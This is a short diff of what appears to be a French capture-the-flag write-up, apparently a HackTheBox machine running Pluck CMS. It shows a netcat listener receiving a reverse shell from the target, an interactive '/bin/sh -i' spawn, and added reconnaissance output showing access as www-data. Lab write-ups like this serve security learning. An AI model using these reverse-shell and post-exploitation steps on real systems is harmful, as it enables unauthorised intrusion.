@@ -206,3 +206,11 @@ listening on [any] 4444 ...
 connect to [10.10.14.174] from (UNKNOWN) [10.10.11.25] 51092
 uname -a; w; id; /bin/sh -i
 ```
+
+Une fois dans le serveur, on fait un peu de recon:
+```bash
+whoami 
+www-data
+pwd
+/var/www/html/pluck
+```
